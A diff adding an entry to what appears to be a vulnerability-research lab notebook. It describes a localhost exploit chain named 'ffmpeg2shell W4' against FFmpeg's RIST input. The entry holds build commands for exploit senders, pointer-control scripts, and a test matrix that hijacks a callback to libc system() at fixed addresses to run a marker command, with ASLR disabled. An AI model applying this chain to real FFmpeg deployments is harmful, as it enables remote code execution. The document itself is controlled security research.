@@ -4092,3 +4092,56 @@ transport stack, socket, server, peer, wire exchange, pointer control, ROP,
 command, marker side effect, witness verdict or rung 5. Live-server
 reachability is UNKNOWN; the advisory's `AV:N` is a claim, not a lab
 observation.
+
+## 2026-11-23 09:1x–09:3xZ — ffmpeg2shell W4 wire-driven command
+
+The W4 limb continues the live RIST limb above. No upstream fetch is needed
+at replay time if the `live/` build from that entry is present; otherwise
+repeat its librist and FFmpeg n9.0 build commands first. All traffic is to
+127.0.0.1:5004. The claim is author-observed rung-5 mechanics under the
+conditions below, not a witness-ESTABLISHED grade.
+
+Build the three W4 senders from the repository (they are tracked):
+
+```sh
+cd lab/frontier/ffmpeg2shell/live
+for s in ptr struct marker cmd; do
+  gcc -O2 -o rist_sender_$s rist_sender_$s.c \
+    -I prefix/include -L prefix/lib -lrist -Wl,-rpath,$PWD/prefix/lib
+done
+```
+
+Pointer reachability without a debugger write: `./reach-plain.sh` expects
+`RP FIRST HIT` followed by `RP NEXT DISPATCH prot=0x5a5a5a5a5a5a5a5a`.
+Wire-chosen target: `./ptr-control.sh pc-file plain/src/ffprobe_g
+0x55555584f5a0 9968` expects `New value = ... <ff_file_protocol>`.
+
+The no-debugger command matrix is authoritative. Run the four cases
+sequentially (never concurrently — they share port 5004):
+
+```sh
+./no-gdb-case.sh ng-v4 plain/src/ffprobe_g /tmp/w4-v \
+  'touch /tmp/w4-v' 9968 rist_sender_cmd 0x7ffff7a58750
+./no-gdb-case.sh ng-f4 plain/src/ffprobe_g-fixed /tmp/w4-f \
+  'touch /tmp/w4-f' 9968 rist_sender_cmd 0x7ffff7a58750
+./no-gdb-case.sh ng-s4 plain/src/ffprobe_g /tmp/w4-s \
+  'touch /tmp/w4-s' 512 rist_sender_live
+./no-gdb-case.sh ng-n4 plain/src/ffprobe_g /tmp/w4-n \
+  'touch /tmp/w4-n' 9968 rist_sender_cmd 0x0
+```
+
+Expect `marker=CREATED` only for `ng-v4` (`ffprobe rc=134` from later heap
+corruption, sender rc 0, 2200 blocks 0 failures) and `marker=absent` for the
+FFMIN-fixed, 512-byte safe and null-callback cases. Recorded digests and
+full expected lines are in `evidence/w4-nogdb-matrix.summary.txt`.
+
+Conditions are part of the claim: `MALLOC_MMAP_THRESHOLD_=16777216` to put
+the 8 MiB FIFO on `[heap]`; `setarch -R` to disable ASLR so the lab-measured
+PIE/libc addresses hold (`ff_file_protocol 0x55555584f5a0`, `system
+0x7ffff7a58750`, `puts 0x7ffff7a87cc0`, ring `0x5555558d1fe0`,
+`URLContext 0x5555560d2080`); main-profile unencrypted RIST; ~8 MiB
+streamed to walk the ring write pointer to the wrap; no debugger attached.
+`system()` under gdb is not a valid replay because gdb holds the forked
+shell. The default-mmap read-only ceiling from W2 is unchanged, and no
+witness replay of W4 has been accepted.
+
